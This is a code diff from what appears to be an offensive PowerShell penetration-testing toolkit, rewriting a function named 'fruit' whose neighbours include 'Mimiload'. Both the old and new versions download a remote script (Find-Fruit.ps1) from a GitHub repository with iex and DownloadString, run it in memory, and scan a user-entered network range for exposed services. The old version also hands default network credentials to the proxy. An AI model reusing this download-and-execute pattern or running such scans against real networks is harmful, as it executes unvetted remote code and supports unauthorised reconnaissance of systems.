@@ -4081,7 +4081,11 @@ function Lapschecks
 
 function fruit
 {
-    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
+   $network = Read-Host -Prompt 'Please enter the CIDR for the network: (example: 192.168.0.0/24)'
+   Write-Host -ForegroundColor Yellow 'Searching...'
+   iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1')
+   Find-Fruit -FoundOnly -Rhosts $network
+   pause;    
 }
 
 function Mimiload
